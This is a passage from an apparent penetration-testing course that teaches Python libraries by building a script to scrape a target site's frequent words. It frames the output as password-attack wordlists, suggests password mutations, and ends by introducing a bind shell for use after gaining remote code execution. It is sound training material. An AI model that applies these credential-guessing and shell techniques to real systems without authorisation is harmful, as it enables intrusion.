['MAXYEAR', 'MINYEAR', '__builtins__', '__cached__', '__doc__', '__file__', '__loader__', '__name__', '__package__', '__spec__', 'date', 'datetime', 'datetime_CAPI', 'sys', 'time', 'timedelta', 'timezone', 'tzinfo']
```

#### The datetime Library

```python
import datetime

now = datetime.datetime.now()
print(now)  # Prints: 2021-03-11 17:03:48.937590
```

As we see, we have to call `datetime.datetime.now()` to get the current timestamp. We import the library, or `module`, `datetime`, which then becomes available to reference by name. This module is also called `datetime`, which contains a `now()` function. So to get to the `now()` function, we first have to reference the module, then the class, and finally the function, all "chained together" to speak with dots.

This may become cumbersome and clutter the code, so let us look at alternative ways of importing:

#### Importing a Class From a Library

```python
from datetime import datetime

print(datetime.now())
```

#### Giving It a New Name

```python
from datetime import datetime as dt

print(dt.now())
```

The above example contains two newlines between the import statement and the code. This is because the PEP-8 style guide, Python's guidelines for "correct" Python, urges developers to add two new lines between import statements and the actual code. It also suggests using the CapWords convention for class names but notes a separate style guide for built-in names. See [https://www.python.org/dev/peps/pep-0008/#class-names](https://www.python.org/dev/peps/pep-0008/#class-names) for more information. This is why classes such as `datetime` are in lowercase.

Next up, we will dive deeper into how to install and manage external libraries in Python.

## Managing Libraries in Python

* * * * *

The most popular way of installing external packages in Python is by using [pip](https://pip.pypa.io/en/stable/). According to the author, `pip` is short for ["pip installs packages"](https://www.ianbicking.org/blog/2008/10/28/pyinstall-is-dead-long-live-pip/index.html), a recursive abbreviation (meaning the definition refers to the abbreviation, and thus circles itself). Very funny indeed. Regardless, `pip` is the name of the Python module that manages external Python packages. With `pip`, we can install, uninstall and upgrade Python packages. Unlike downloading and installing plugins for a browser or text editor, it is not common to "go shopping" for Python packages.

Programming is all about using the right tool for the job, so do not worry about finding packages to install. The right approach, and probably also the one most common, is finding out `how to do something` and getting package recommendations along the way. The documentation of these packages - their websites most of the time - will typically show examples of installing the package for first-time users. Let us look at how to manage packages as well.

Some valuable arguments for `pip` that we will look at are `install` and`--upgrade` flag, `uninstall` and `freeze`. The `install` argument lets users install new packages or upgrade existing packages to the latest version (if the `--upgrade` parameter is provided). The `uninstall` argument will, as its name suggests, remove the package from the system. Surprisingly the `freeze` command has nothing to do with halting anything or cheesy police movies. This prints a list of all the installed (via pip) packages and their dependencies. We can call the commands either using `pip` directly or as a Python module. Below are some examples of how this might look.

#### Installing "flask" with Pip

	# Syntax: python3 -m pip install [package]
	python3 -m pip install flask

```text
Collecting flask
  Using cached Flask-1.1.2-py2.py3-none-any.whl (94 kB)
Collecting Werkzeug>=0.15
  Using cached Werkzeug-1.0.1-py2.py3-none-any.whl (298 kB)
Collecting itsdangerous>=0.24
  Using cached itsdangerous-1.1.0-py2.py3-none-any.whl (16 kB)
Collecting click>=5.1
  Using cached click-7.1.2-py2.py3-none-any.whl (82 kB)
Collecting Jinja2>=2.10.1
  Downloading Jinja2-2.11.3-py2.py3-none-any.whl (125 kB)
     |████████████████████████████████| 125 kB 7.0 MB/s 
Collecting MarkupSafe>=0.23
  Downloading MarkupSafe-1.1.1-cp39-cp39-macosx_10_9_x86_64.whl (16 kB)
Installing collected packages: Werkzeug, itsdangerous, click, MarkupSafe, Jinja2, flask
Successfully installed Jinja2-2.11.3 MarkupSafe-1.1.1 Werkzeug-1.0.1 click-7.1.2 flask-1.1.2 itsdangerous-1.1.0
```

As can be seen, even though we only asked to install `flask`, a brilliant package for running Python-based web servers (as is `bottle` - same-same, but different), we get a multitude of other packages as well, which are all requirements of `flask`. We could try to upgrade it, but we are already told that we are already running the latest version.

#### Upgrading Packages

	python3 -m pip install --upgrade flask

```text
Requirement already up-to-date: flask in /usr/local/lib/python3.9/site-packages (1.1.2)
Requirement already satisfied, skipping upgrade: itsdangerous>=0.24 in /usr/local/lib/python3.9/site-packages (from flask) (1.1.0)
Requirement already satisfied, skipping upg...
<SNIP>
```

If we wanted to uninstall a particular package, we could do so by calling:

#### Uninstalling Packages

	pip uninstall [package]

Let us see what is currently installed by running `pip` with the `freeze` argument. As some of them are dependencies of `flask`, we will leave the uninstallation itself as "extras." Please note that if we choose to uninstall a dependency package, the primary package likely will not work. Also, note that `freeze` may produce different outputs from machine to machine and Python version to Python version.

#### Listing the Installed Packages

	# Syntax: python3 -m pip freeze [package]
	python3 -m pip freeze

```text
click==7.1.2
Flask==1.1.2
itsdangerous==1.1.0
Jinja2==2.11.3
MarkupSafe==1.1.1
protobuf==3.13.0
pynput==1.7.3
pyobjc-core==7.1
pyobjc-framework-Cocoa==7.1
pyobjc-framework-Quartz==7.1
six==1.15.0
Werkzeug==1.0.1
```

This list of installed packages would be nice to be given to another person to either use our scripts or help with development. This way, they will know which packages need to be installed (and which versions even).

It just so happens to be the case that `pip` supports maintaining packages from a requirements file. This file, often called literally `requirements.txt`, contains a list of all the required packages needed to run the script successfully. The format is quite simple. We would copy the above `freeze` output and save it as a requirements file. However, it is a little bloated, and we do not need to know or even list the dependencies of the packages we need.

For the sake of an example, let us suppose that we would like to use `flask` and `click` (we will return to `click` later). If we do not know the version requirements or do not mind, either way, we could list the packages one after the other and save them, like so:

#### Example requirements.txt

	cat requirements.txt

```text
flask
click
```

Then, to install all the packages in the requirements file, we would type:

#### Install from requirements.txt

	python3 -m pip install -r requirements.txt

This will then go through each of the requirements and install them by selecting the latest available and permitted version. Say we explicitly wanted `flask` version 1.1.2. All we had to do was replace `flask` with `flask==1.1.2` in the requirements file, just like the `pip freeze` command output. Below is a list of common version compassion operators that we are highly likely to come across in larger Python projects (read more at [PEP 440](https://www.python.org/dev/peps/pep-0440/#version-specifiers)).

| Compassion Operator | Description |
| --- | --- |
| `==` | Version matching clause |
| `<=` / `>=` | Inclusive ordered comparison clause |
| `<` / `>` | Exclusive ordered comparison clause |

They let us specify, in the requirements file, our exact requirements to versions. For example, if we know that some package `xyz` is vulnerable to exploitation at versions 1.0.4 and lower, we can specify in our requirements file that we need `xyz>=1.0.5`. It is also pretty common for new updates of a package to break the current code (e.g., packages that rely on other third-party systems like the Discord bot API for Python). In these cases, we can force an older version of a package. At the same time, the needed changes were being worked on with the `<` or `<=` operator.

To not dig too deep into it right from the start, we will return to this topic later in the module. For now, let us move on with some pre-requisites for our first project.

## The Importance of Libraries

* * * * *

Now that we know how important libraries can be for our development and how to manage them let us discuss two of the more popular ones that we will use in our project, starting with the `requests` library.

* * * * *

### The Requests Package
--------------------

The [requests](https://requests.readthedocs.io/en/master/) library is an elegant and simple HTTP library for Python. From the documenation:

>Requests allows you to send HTTP/1.1 requests extremely easily. There's no need to manually add query strings to your URLs, or to form-encode your POST data. Keep-alive and HTTP connection pooling are 100% automatic, thanks to urllib3.

Let us install requests just like we have learned.

#### Installing requests

	python3 -m pip install requests

```text
Collecting requests
  Downloading requests-2.25.1-py2.py3-none-any.whl (61 kB)
     |████████████████████████████████| 61 kB 3.8 MB/s
Collecting chardet<5,>=3.0.2
  Downloading chardet-4.0.0-py2.py3-none-any.whl (178 kB)
     |████████████████████████████████| 178 kB 6.8 MB/s
Collecting certifi>=2017.4.17
...SNIP...
Successfully installed certifi-2020.12.5 chardet-4.0.0 idna-2.10 requests-2.25.1 urllib3-1.26.3
```

Once installed, we can import the library into our code by typing `import requests` and then use it right away.

The two most useful things to know about the requests library are making HTTP requests, and secondly, it has a `Session` class, which is useful when we need to maintain a certain context during our web activity. For example, if we need to keep track of a range of cookies, we could use a `Session` object. To get one of these, we `import requests` and create an object of the `Session` class like `sess = requests.Session()`. Alternatively, we can use the `requests` module (the library itself) to make HTTP requests. However, this will not keep its state automatically.

Consider the following code:

#### Example of Requests

```python
import requests

resp = requests.get('http://httpbin.org/ip')
print(resp.content.decode())

# Prints:
# {
#   "origin": "X.X.X.X"
# }
```


This is a simple example of how to perform a GET request to obtain our public IP address. Since the `resp.content` variable is a `byte-string`, a string of bytes that may or may not be printable, we have to call `decode()` on the object. Decoding the `byte-string` with the `decode()` function and no parameters tells Python to interpret the bytes as UTF-8 characters. UTF-8 is the default encoding used when no other encoding is specified. However, other encodings can be used and set as parameter arguments to the `decode()` function, for example, `decode(encoding='UTF-16')`. Going back to the `resp` object, this contains useful information such as the `status_code`, the numeric HTTP status code of the request we made, and cookies. We will use this library later on, but for now, let us move on with some more food talk.

* * * * *

### The BeautifulSoup Package
-------------------------

Another handy package is the BeautifulSoup library (rather `beautifulsoup4`). This library makes working with HTML a lot easier in Python. Before, we learned how to query a website and get output back, which could be the raw HTML. Digging through this HTML can be cumbersome if we have to search through textual output by hand. BeautifulSoup turns the HTML into Python objects that are much easier to work with and allows us to analyze the content better programmatically. Let us install BeautifulSoup.

#### Installing BeautifulSoup

	python3 -m pip install beautifulsoup4

```text
Collecting beautifulsoup4
  Downloading beautifulsoup4-4.9.3-py3-none-any.whl (115 kB)
     |████████████████████████████████| 115 kB ...
Collecting soupsieve>1.2
  Downloading soupsieve-2.2-py3-none-any.whl (33 kB)
Installing collected packages: soupsieve, beautifulsoup4
Successfully installed beautifulsoup4-4.9.3 soupsieve-2.2
```

Once installed, let's go through some quick examples of how to use `BeautifulSoup`. For a more in-depth walkthrough, please visit the [documentation](https://www.crummy.com/software/BeautifulSoup/bs4/doc/). For now, please consider the below code:

#### HTML - Ugly Format

```html
<html>
<head><title>Birbs are pretty</title></head>
<body><p class="birb-food"><b>Birbs and their foods</b></p>
<p class="food">Birbs love:<a class="seed" href="http://seeds" id="seed">seed</a>
   and 
   <a class="fruit" href="http://fruit" id="fruit">fruit</a></p>
 </body></html>
```

This HTML looks a little messy. We will assume that this HTML is stored in a variable `html_doc`. We'll then load this into BeautifulSoup and print it in a nicely formatted way, as follows:

#### Example of BeautifulSoup

```python
from bs4 import BeautifulSoup

html_doc = """ html code goes here """
soup = BeautifulSoup(html_doc, 'html.parser')
print(soup.prettify())
```

which then prints:

#### HTML - Pretty Format

```html
<html>
 <head>
  <title>
   Birbs are pretty
  </title>
 </head>
 <body>
  <p class="birb-food">
   <b>
    Birbs and their foods
   </b>
  </p>
  <p class="food">
   Birbs love:
   <a class="seed" href="http://seeds" id="seed">
    seed
   </a>
   and
   <a class="fruit" href="http://fruit" id="fruit">
    fruit
   </a>
  </p>
 </body>
</html>
```

The import statement of BeautifulSoup is worth noticing. Because the class `BeautifulSoup` lies within the module `bs4` we will usually import it this way. What happens in the code is that the class is imported from the module, and then we create a new BeautifulSoup object and set the parser of the class to the HTML parser of BeautifulSoup. We need to set this parser when loading HTML.

Let us not delve too long into thought-up examples and instead move straight to the actual implementation of our final product: the word extractor.

# Word Extractor

## The First Iterations

* * * * *

We will start implementing the program little by little, always ensuring that we reach a milestone where the code works, even though it may not be entirely complete yet. Even if we have a firm idea of how the code will be implemented and what it will look like in the end, it is still a good idea to take it slow and build things up layer by layer.

Since we want to end up with a program that can fetch all words of a webpage and perhaps also have a few other features, let us first write the code needed to do the most basic task: printing the HTML of a webpage. In short, this is what we should be aiming for:

-   The code will download and print the entire HTML of a webpage.
-   The URL of the webpage is fixed inside the code.
-   We will write the code in its simplest form and rewrite bits and pieces as needed when we need to.
-   We will use the `requests` library.

So first things first, let us import the requests library and store the target URL in a variable. Then we use the requests library to get the URL that we provided and print the HTML.

#### Printing Web Page Source Code

```python
import requests

PAGE_URL = 'http://target:port'

resp = requests.get(PAGE_URL)
html_str = resp.content.decode()
print(html_str)
```

Now, what happens if we misspell the URL? Let's try it out in our Python interactive terminal and see:

#### Experimenting in IDLE

```python
>>> r = requests.get('http://target:port/missing.html')
>>> r.status_code

404
>>> print(r.content.decode())

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
        "http://www.w3.org/TR/html4/strict.dtd">
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
        <title>Error response</title>
    </head>
    <body>
        <h1>Error response</h1>
        <p>Error code: 404</p>
        <p>Message: File not found.</p>
        <p>Error code explanation: HTTPStatus.NOT_FOUND - Nothing matches the given URI.</p>
    </body>
</html>
```

On a positive note, we do get a proper `status_code` from the webserver, which in this example is the webserver module that comes along with Python (`http.server`). However, if we were expecting that the HTML output contains specific elements that we then tried to access and use, for example, a `<div id="products">`, our Python program would crash while trying to use things that do not exist. There are no products on this error page! Whoops. Let us implement a simple fail check that makes sure we do not try to work with broken links.

#### Naive "error" Handling

```python
import requests

PAGE_URL = 'http://target:port'

resp = requests.get(PAGE_URL)

if resp.status_code != 200:
    print(f'HTTP status code of {resp.status_code} returned, but 200 was expected. Exiting...')
    exit(1)

html_str = resp.content.decode()
print(html_str)
```

Now though, we have some code that does something, but it is not in a function. To avoid cluttering the code, it is advisable to keep things `simple` and `separate`, so let us go ahead and `refactor` the code, that is, let us change and thus improve the code.

* * * * *

### The get_html_of Function
------------------------

Let us take a look at the following code:

```python
import requests

PAGE_URL = 'http://target:port'

def get_html_of(url):
    resp = requests.get(url)

    if resp.status_code != 200:
        print(f'HTTP status code of {resp.status_code} returned, but 200 was expected. Exiting...')
        exit(1)

    return resp.content.decode()

print(get_html_of(PAGE_URL))
```

We moved the part of the code that fetches the HTML into a function and then changed the last line of the code to print the result of this function call instead of a variable (which no longer exists). Also, notice the indentation within the function.

Having gotten the most basic functionality in place, we can begin to work with the HTML page. So, let us for a moment think about what it is we need to do. For this kind of exercise, it can be a good idea to list actions upon a piece of paper, and then for each action, ask oneself, "How do I do this?" and then write up those steps next to it. In our case, we need to:

-   Find all words on the page, ignoring HTML tags and other metadata.
-   Count the occurrence of each word and note it down.
-   Sort by occurrence.
-   Do something with the most frequently occurring words, e.g., print them.

How do we find all words on the page, ignoring HTML tags and other metadata? This is where BeautifulSoup comes into play. A quick look at the documentation (https://www.crummy.com/software/BeautifulSoup/bs4/doc/) shows that we can call the `get_text()` BeautifulSoup object to get all of the text on the webpage as a string.

Next, we need to count the occurrences of each word. There are many ways to do this. We could pick the first word, count all occurrences of that, note it down, and note down which word we already counted. Then we could move to the next word and - if it has not already been counted - count the occurrence and note this down along with checking off the word as "counted." This process is relatively simple but also rather slow. Imagine doing this exercise for an entire book full of words. This is relatively inefficient.

Let us be more innovative and think for a moment if an application or machine in real life already accounts for several items of a specific size, shape, or value. The coin counter in old vending machines comes to mind.

#### Old School Vending Machines

>Before smartphones and the digitalization of many machines was a thing, vending machines would have to count the number of coins somebody inserted and how many of each. Some machines could do this by having the coin slide down a ramp and have the coin slide into the smallest possible hole, starting from small to large. As such, a large coin would slide over a small coin hole, whereas a small coin would fall through the hole. A coin would then be accounted for once (e.g., by activating a small metal arm/switch as it falls).

If we count words the same way some vending machines count coins, we can count all occurrences of all words and only need to go through the text once. We will have a `dictionary` of word occurrences and then, for each word, check if this has been seen before. If it has, we will increment the count by one. If it has not been added before, we will add a record of the word and an occurrence of one of the words.

After this, we have to sort by occurrence to see which words occurred the most, and then finally, we can decide to print the ten most used words. Alternatively, we could filter the words and only look at those above four characters or append variations of numbers and symbols and generate a dictionary for password attacks. More on that later.

* * * * *

### Regex
-----

The first step was to find all words in the HTML while ignoring HTML tags. If we use the `get_text()` function we discussed earlier, we can use the `regular expression` module `re` to help us. This module has a `findall` function which takes some string of `regex` (shorthand for "`reg`gular `ex`pression") and some text as parameters and then returns all occurrences in a list. We will use the regex string `\w+`, which matches all word characters, that is, `a-z`, `A-Z`, `0-9`, and `_`. Here is the updated code:

#### Finding All Words in HTML

```python
import requests
import re
from bs4 import BeautifulSoup

PAGE_URL = 'http://target:port'

def get_html_of(url):
    resp = requests.get(url)

    if resp.status_code != 200:
        print(f'HTTP status code of {resp.status_code} returned, but 200 was expected. Exiting...')
        exit(1)

    return resp.content.decode()

html = get_html_of(PAGE_URL)
soup = BeautifulSoup(html, 'html.parser')
raw_text = soup.get_text()
all_words = re.findall(r'\w+', raw_text)
```

One new addition to the mix is the `r'...'` string. This is a `r`aw string, meaning Python should assume that characters inside the string are the actual characters to use. Normally a `\` is used as an `escape-character`, which helps us define special characters - or bytes rather - for example, the `\n` or `\t`, the new line and tab characters, respectively. Here `r'\w+'` is telling Python to interpret the `\w` part of the string as two individual characters and not an escaped `w`.

When we run this, nothing happens except in memory. The `all_words` variable is, assuming everything goes well, a list of all the words from the webpage in order of occurrence and including duplicates. We will next loop through this list and count each word. One way to achieve that is this below piece of code:

#### Counting Word Occurrences

```python
# Previous code omitted
all_words = re.findall(r'\w+', raw_text)

word_count = {}

for word in all_words:
    if word not in word_count:
        word_count[word] = 1
    else:
        current_count = word_count.get(word)
        word_count[word] = current_count + 1
```

This snippet should look familiar. To recap quickly, we declare a new variable `word_count` as an empty dictionary - a data structure of key/value pairs allowing the lookup of some value given some key. Then we go through each word in `all_words` and check if it exists already. We set the key (word) to a value of `1` if it does not. Otherwise (else), we get the current value set for `word` and set the new value of `word` to the previous value plus one.

We now have a dictionary of all the words found on the website and their respective occurrence.

**Advanced Tricks: "Python is easy"**

>It is often said that Python is easy, to which my reply always is "simple Python is easy, complex Python is not". The previous example of counting >words can in fact be cut down to these two lines:  
  >
>for word in all_words:  
    word_count[word] = word_count.setdefault(word, 0) + 1  
 > 
>However the amount of things happening here is quite surprising. In short, "setdefault" will EITHER set the value of the key ("word") to the specified value (0), if the dictionary does not already contain a "word" key, OR it will return the current value of the "word" key. The 2nd line thus EITHER sets a value of 1 for the "word" key, OR it fetches the current value and increments it by one. Confusing? Yes. Our point? Fancy code is not always the best choice, so keep it simple and smart. We are not here to show off, we are here to solve problems.

To get a sorted list of the words so that we can focus on the most occurring ones, we either magically come up with the below piece of code or - more realistically - we Google for help ("python sort dictionary by values" and similar search terms) and find the below answer.

#### Sorting Words in a List

```python
top_words = sorted(word_count.items(), key=lambda item: item[1], reverse=True)
```

As with all things online, do not just blindly trust that they are not malicious. As for highly-rated content and answers with lots of positive feedback, a bit of advice is the old saying: trust, but verify. Once we are sure that the piece of code we found is what we need. We can finally print the top-10 words like so:

#### Printing 10 Elements

```python
>>> top_words = sorted(word_count.items(), key=lambda item: item[1], reverse=True)
>>> for i in range(10):
...    print(top_words[i])
```

Doing so will print an output along the lines of:

```python
>>> top_words = sorted(word_count.items(), key=lambda item: item[1], reverse=True)
>>> for i in range(10):
...    print(top_words[i])

('foo', 6)
('bar', 5)
('bas', 5)
('hello', 4)
('academy', 4)
('birb', 1)
```

This looks perhaps a little odd or at least not very useful for our onwards journey. What we can do is to print the actual word instead of printing each tuple of (word, occurrence) by selecting the first element of the tuple for each tuple (`top_words[i][0]`). The current iteration of the entire code looks like this:

#### The First Iteration

```python
import requests
import re
from bs4 import BeautifulSoup

PAGE_URL = 'http://target:port'

def get_html_of(url):
    resp = requests.get(url)

    if resp.status_code != 200:
        print(f'HTTP status code of {resp.status_code} returned, but 200 was expected. Exiting...')
        exit(1)

    return resp.content.decode()

html = get_html_of(PAGE_URL)
soup = BeautifulSoup(html, 'html.parser')
raw_text = soup.get_text()
all_words = re.findall(r'\w+', raw_text)

word_count = {}

for word in all_words:
    if word not in word_count:
        word_count[word] = 1
    else:
        current_count = word_count.get(word)
        word_count[word] = current_count + 1

top_words = sorted(word_count.items(), key=lambda item: item[1], reverse=True)

for i in range(10):
    print(top_words[i][0])
```

#### Questions

>What is the 3rd most used word on the exercise target website?

## Continuously Improving The Code

* * * * *

At this point, we have a working Python script that will extract words from a webpage and print the top-10 most occurring ones to the console.

Let us suppose that our engagement required us to count words on two web pages. We would then need to repeat large amounts of the above code for the new webpage. Alternatively, we could *refactor* the current code and move the word counting part into its function.

#### Extracting The Counting Code to Its Function

```python
def count_occurrences_in(word_list):
    word_count = {}
    for word in word_list:
        if word not in word_count:
            word_count[word] = 1
        else:
            current_count = word_count.get(word)
            word_count[word] = current_count + 1
    return word_count
```

Notice how we added an input parameter and replaced the list of words to iterate over to this new `word_list` parameter. We also added a `return statement` at the bottom so that our function can give back the result. We can do the same for the code that currently acts like glue in our script:

#### Current Glue

```python
html = get_html_of(PAGE_URL)
soup = BeautifulSoup(html, 'html.parser')
raw_text = soup.get_text()
all_words = re.findall(r'\w+', raw_text)
```

By simply replacing the `PAGE_URL` constant (by naming convention - it's not constant) with the `url` variable and returning the result of the regular expression `findall` call, we've turned the static glue into reuseable code:

#### Refactored to Its Function

```python
def get_all_words_from(url):
    html = get_html_of(url)
    soup = BeautifulSoup(html, 'html.parser')
    raw_text = soup.get_text()
    return re.findall(r'\w+', raw_text)

all_words = get_all_words_from(PAGE_URL)
```

If we perform the same exercise for the remaining code, we get this:

#### Refactoring the Remaining Code

```python
import requests
import re
from bs4 import BeautifulSoup

PAGE_URL = 'http://target:port'

def get_html_of(url):
    resp = requests.get(url)

    if resp.status_code != 200:
        print(f'HTTP status code of {resp.status_code} returned, but 200 was expected. Exiting...')
        exit(1)

    return resp.content.decode()

def count_occurrences_in(word_list):
    word_count = {}

    for word in word_list:
        if word not in word_count:
            word_count[word] = 1
        else:
            current_count = word_count.get(word)
            word_count[word] = current_count + 1
    return word_count

def get_all_words_from(url):
    html = get_html_of(url)
    soup = BeautifulSoup(html, 'html.parser')
    raw_text = soup.get_text()
    return re.findall(r'\w+', raw_text)

def get_top_words_from(all_words):
    occurrences = count_occurrences_in(all_words)
    return sorted(occurrences.items(), key=lambda item: item[1], reverse=True)

all_words = get_all_words_from(PAGE_URL)
top_words = get_top_words_from(all_words)

for i in range(10):
    print(top_words[i][0])
```

Notice, in addition to the above, the following piece of refactored code.

#### Glue, But Cleaner

```python
def get_top_words_from(url):
    all_words = get_all_words_from(url)
    occurrences = count_occurrences_in(all_words)
    return sorted(occurrences.items(), key=lambda item: item[1], reverse=True)
```

This function takes a URL as a parameter and then immediately uses the URL to call another function that gets the list of words needed. This additional refactoring made the code a fair bit cleaner and easier to read `in this situation`. If we were to crawl ten pages, we would need to refactor yet again, not to repeat ourselves over and over again. Alternatively, we could load a list of URLs from a text file, do the word collecting for each URL and aggregate the data in the end. However, instead of trying to solve a problem that does not exist, let us move on.

#### Optional Exercises

>Challenge your understanding of the Module content and answer the optional question(s) below. These are considered supplementary content and are not required to complete the Module. You can reveal the answer at any time to check your work.
>
>What's the price per month for a family account, after the initial trial period?

## Further Improvements

* * * * *

Recall what we discussed in the beginning about importing modules and that Python scripts are executed from top to bottom, even when imported. This means that if somebody were to import our script, e.g., reuse some of our functions (it could be ourselves), the code would run as soon as imported. The typical way to avoid this is to put all the code that `does something` into the "main" block. Let us do that:

#### The "main" Block

```python
if __name__ == '__main__':
    page_url = 'http://target:port'
    the_words = get_all_words_from(page_url)
    top_words = get_top_words_from(the_words)

    for i in range(10):
        print(top_words[i][0])
```

The most important thing to know about the conditional statement is what we need to type to have the code inside it run whenever we execute it with the Python binary. Please refer to the brilliant answer at [StackOverflow](https://stackoverflow.com/a/419185) for an in-depth explanation of what is going on here. The critical takeaway is that the code inside this conditional statement only gets executed when the script is `run`, not `imported`.

However, we can remove the constant `PAGE_URL`, which we relied on before, and have everything inside the code's main block.

Another improvement we can make is getting rid of the URL variable altogether by making the script flexible and accepting an input argument when running Python and the script. For example, we could enhance the program to accept input arguments along the lines of `python3 wordextractor.py http://foo.bar/baz` or better yet, prepare the script to accept named parameters in an arbitrary order, e.g.:

#### Accepting Arguments

	python3 wordextractor.py --url http://foo.bar/baz

Doing so would allow us to easily extend the program with, for example, a word length limit, so we avoid uninteresting words like `and`, `is` and `that`.

Let us look at one module to help us achieve this: [click](https://click.palletsprojects.com/).

To understand what `click` does, we need to talk about `decorators`. However, since this is a bit of a mouthful to jump right into, let us leave it as optional reading at the end of this section. All we need to know about `click` at this point is a few simple click-specific concepts that are easy to memorize. Let us get started by installing it as always using pip: `pip3 install click`. The following is an example script from the official documentation, but slightly modified for simplicity's sake:

#### A Simple Click Script

```python
import click

@click.command()
@click.option('--count', default=1, help='Number of greetings.')
@click.option('--name', prompt='Your name', help='The person to greet.')
def hello(count, name):
    for i in range(count):
        click.echo('Hello %s!' % name)

if __name__ == '__main__':
    hello()
```

Lots of new things happened here in relatively few lines of code. First of all, there are the `decorators` which, in a sense, "decorate functions." These are the things about the function definition that start with an `@`. We need to focus on not getting too technical too quickly because these decorators in `click` let us set up command-line arguments to the script. First, we specify the `@click.command()` decorator, indicating that we will have a command-line input for this `hello` function. Then two `@click.option` options are specified. In this example, the parameters are pretty straightforward: we have got a `default` for the count, in case this is not specified as a command-line argument, we have `help` text for the `--help` output, and we have a `prompt` parameter. This tells Python to `prompt` the user for input if no command-line argument is given.

Lastly and probably most importantly, notice that all the "main part" of the code does is call the `hello()` function. Click requires us to call a function with these decorators specified to work. Also, notice that the parameter names for the function `hello` and the input argument names `--count` and `--name` match names if we ignore the `--`.

Let us look at some examples to illustrate things better. First up is a plain run without any arguments. Here we are prompted for an input for the `--name` parameter:

#### Playing With Click

```text
C:\Users\Birb> python click_test.py

Your name: Birb
Hello Birb!
```

This we can also specify explicitly:

```text
C:\Users\Birb> python click_test.py --name Birb

Hello Birb!
```

Moreover, the `--count` parameter can be explicitly set instead of it being 1 by default:

```text
C:\Users\Birb> python click_test.py --name Birb --count 3

Hello Birb!
Hello Birb!
Hello Birb!
```

Lastly, here is the `--help` output:

```text
C:\Users\Birb> python click_test.py --help

Usage: click_test.py [OPTIONS]

Options:
  --count INTEGER  Number of greetings.
  --name TEXT      The person to greet.
  --help           Show this message and exit.
```

As we can see in the help message, `INTEGER` and `TEXT` are printed. However, we never actually specified this in the code. The reason is that `click` will attempt to `guess the correct type` based on things like the `default` parameter. For more information, please refer to the (relatively well written) documentation.

In preparation for using `click`, we will move all the code previously in the "main part" of the script into its own, new `main()` function. The name of this new function is not essential as long as the function is being called.

#### Refactoring Into Separate Function

```python
def main():
    page_url = 'http://target:port'
    the_words = get_all_words_from(page_url)
    top_words = get_top_words_from(the_words)

    for i in range(10):
        print(top_words[i][0])

if __name__ == '__main__':
    main()
```

We then need to add the click functionality to the function, as well as replace variables where needed:

#### Adding Click Options

```python
@click.command()
@click.option('--url', '-u', prompt='Web URL', help='URL of webpage to extract from.')
@click.option('--length', '-l', default=0, help='Minimum word length (default: 0, no limit).')
def main(url, length):
    the_words = get_all_words_from(url)
    top_words = get_top_words_from(the_words, length)
    # Remaining code omitted
```

As can be seen, we added two parameters to the function, `url` and `length`, and used these instead of the hardcoded URL we used before. The parameter names must be the same as the `--name` in the option spec for click to automatically map the input to those variables. If we were to use an input argument (i.e., a `click.option`) that had to be different than the parameter name in Python - e.g., for aesthetic reasons - we could tell `click` to map the variables appending the Python parameter name after the argument option names, e.g., `@click.option('--url', '-u', 'target_uri', ...)`.

In this case, we can let the `count_occurrences_in` function deal with the filtering. To do this, we need to first pass in the length variable into the `get_top_words_from` function, and inside this one, pass it along to the `count_occurrences_in` function. There are many ways to do this. If we were to add another filtering option, e.g., only find words that match some regex, it could be a good idea to keep the filtering a separate process that can apply a filter on a list of words and return those that match. The following two functions were updated:

```python
def count_occurrences_in(word_list, min_length):
    word_count = {}

    for word in word_list:
        if len(word) < min_length:
            continue
        if word not in word_count:
            word_count[word] = 1
        else:
            current_count = word_count.get(word)
            word_count[word] = current_count + 1
    return word_count

def get_top_words_from(all_words, min_length):
    occurrences = count_occurrences_in(all_words, min_length)
    return sorted(occurrences.items(), key=lambda item: item[1], reverse=True)
```

Starting at the bottom, we pass along the `min_length` parameter to the first function. In here we add one additional check: `if len(word) < min_length`. If it is, we `continue`, which in the context of a loop means "do not bother about the rest of this block, simply skip ahead to the next element and forget about this one." So, if the word is shorter than our minimum length, we will `continue` to the next word and thus _not_ add it to the `word_count` dictionary.

The final script looks like this:

#### The Final Script

```python
import click
import requests
import re
from bs4 import BeautifulSoup

def get_html_of(url):
    resp = requests.get(url)

    if resp.status_code != 200:
        print(f'HTTP status code of {resp.status_code} returned, but 200 was expected. Exiting...')
        exit(1)

    return resp.content.decode()

def count_occurrences_in(word_list, min_length):
    word_count = {}

    for word in word_list:
        if len(word) < min_length:
            continue
        if word not in word_count:
            word_count[word] = 1
        else:
            current_count = word_count.get(word)
            word_count[word] = current_count + 1
    return word_count

def get_all_words_from(url):
    html = get_html_of(url)
    soup = BeautifulSoup(html, 'html.parser')
    raw_text = soup.get_text()
    return re.findall(r'\w+', raw_text)

def get_top_words_from(all_words, min_length):
    occurrences = count_occurrences_in(all_words, min_length)
    return sorted(occurrences.items(), key=lambda item: item[1], reverse=True)

@click.command()
@click.option('--url', '-u', prompt='Web URL', help='URL of webpage to extract from.')
@click.option('--length', '-l', default=0, help='Minimum word length (default: 0, no limit).')
def main(url, length):
    the_words = get_all_words_from(url)
    top_words = get_top_words_from(the_words, length)

    for i in range(10):
        print(top_words[i][0])

if __name__ == '__main__':
    main()
```

For the extra adventurous student, here is a list of ideas for further extension of the tool:

-   Add a `--output` / `-o` argument that lets us define an output file to print to instead of the console (something like `with open('path.txt', 'w') as wr:` and `wr.write(word)`).

-   Add common password mutations to the output, e.g., Capitalized, lowercase, UPPERCASE, and with various bits appended like the current and recent years, random numbers or symbols, e.g., 2019, 1!, 2!, 3!, 01, 123. `Summer2021!` and similar variations are depressingly frequent passwords.

-   Add a `--depth` / `-d` argument specifying the *crawl depth* of the script. This implies the ability to grab not only words but also URLs on the webpage(s), check if they are within scope (e.g., domain), and add them to a list of pages to crawl next.

-   The program currently crashes if a minimum length of 10 or higher is specified. Try to figure out why and fix it (hint: check out that last for-loop).

#### Questions

>Given a minimum word length of 9, what is the 3rd most frequent word on the target website?

# Turning it up to 11

## A Simple Bind Shell

* * * * *

Upon gaining access to an internal web service with the credentials we generated using the previous tool, we can get remote code execution on the web host. Trying to use our go-to reverse shells mysteriously does not seem to work, but we discover that we can execute arbitrary python scripts. Let us abuse that discovery by implementing and running our own Python `bind shell`.

